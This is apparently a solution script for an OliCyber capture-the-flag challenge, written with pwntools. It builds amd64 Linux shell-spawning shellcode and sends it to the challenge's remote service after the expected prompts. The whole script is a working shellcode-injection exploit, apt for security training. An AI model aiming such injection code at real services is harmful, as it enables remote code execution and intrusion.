from pwn import *

r = remote("software-20.challs.olicyber.it",13003)

asm_code = shellcraft.amd64.linux.sh()
shellcode = asm(asm_code, arch='x86_64')

print(r.recvuntil(b'iniziare ...'))
r.sendline(b'a')
print(r.recvuntil(b'): '))
r.sendline(b'48') #len(shellcode)
print(r.recvuntil(b'bytes: '))
r.sendline(shellcode)
print(r.recvline())
print(r.recvline())
#r.interactive()